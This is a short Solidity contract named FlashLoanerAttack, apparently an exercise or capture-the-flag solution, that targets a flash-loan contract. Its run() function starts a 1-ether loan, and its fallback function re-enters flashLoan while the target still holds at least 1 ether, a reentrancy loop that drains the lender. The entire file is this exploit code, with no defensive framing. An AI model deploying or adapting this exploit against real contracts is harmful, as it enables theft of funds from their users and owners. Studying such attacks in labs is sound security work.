// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.0;

interface FlashLoaner {
    function flashLoan(uint256 _requestedAmount, address payable _recipient, bytes memory _callback) external returns (bool);
}

contract FlashLoanerAttack {
    
    FlashLoaner fl;
    
    constructor(FlashLoaner _flashLoaner) {
        fl = _flashLoaner;
    }
    
    function run() external {
        fl.flashLoan(1 ether, payable(msg.sender), abi.encodeWithSignature("yeet()"));

    }
    
    fallback() external payable {
        if (address(fl).balance >= 1 ether) {
            fl.flashLoan(1 ether, payable(msg.sender), abi.encodeWithSignature("yeet()"));
        }
    }
}